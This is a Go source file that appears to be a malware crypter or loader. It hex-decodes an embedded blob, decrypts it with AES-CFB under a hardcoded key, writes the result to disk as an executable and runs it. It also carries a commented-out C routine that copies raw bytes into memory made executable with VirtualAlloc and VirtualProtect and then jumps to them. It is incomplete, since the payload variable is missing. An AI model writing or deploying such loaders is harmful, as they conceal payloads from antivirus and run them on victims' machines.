package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "crypto/rand"
	_ "io"
	_ "os"
	"os/exec"
	"fmt"
	"encoding/hex"
	"io/ioutil"

)


/*
#include <Windows.h>

int executeByteCode(byte Rawcode[])
{
	DWORD old_protect;
	LPVOID executable_area = VirtualAlloc(NULL, 11414, MEM_RESERVE, PAGE_READWRITE);

	memcpy(executable_area, Rawcode, 11414);
	VirtualProtect(executable_area, 11414, PAGE_EXECUTE, &old_protect);

	int(*f)() = (int(*)()) executable_area;
	f();

	// Note: RAII this in C++. Restore old flags, free memory.
	VirtualProtect(executable_area, 11414, old_protect, &old_protect);
	VirtualFree(executable_area, 11414, MEM_RELEASE);
	return 0;
}
*/
//import "C"






var iv = []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}
var plaintext []byte
var key_text string

func main() {
    key_text := "tvSaNPNw0ZgzApXHyb1yuw6hqGEpN0iu" //generate random 32 char string

    // read the whole file at once



    e, _ := hex.DecodeString(hexString)
    ioutil.WriteFile("encrypted.exe", []byte(e), 0777)
    i := Decrytp(e, key_text)

    //C.executeByteCode((*C.byte)(unsafe.Pointer(&i)));
    ioutil.WriteFile("decrypted.exe", i, 0777)

	c := exec.Command("decrypted.exe")
	out, _ := c.Output()
	c.Run()
	fmt.Println(string(out))
}
func Encrypt(plaintext []byte, key_text string) []byte{
    c, _ := aes.NewCipher([]byte(key_text))
    ciphertext := make([]byte, len(plaintext))
    cfb := cipher.NewCFBEncrypter(c, iv)
    cfb.XORKeyStream(ciphertext, plaintext)
    return ciphertext
}

func Decrytp(ciphertext []byte, key_text string) []byte {
    c, _ := aes.NewCipher([]byte(key_text))
    cfbdec := cipher.NewCFBDecrypter(c, iv)
    plaintextCopy := make([]byte, len(ciphertext))
    cfbdec.XORKeyStream(plaintextCopy, ciphertext)
    return plaintextCopy

}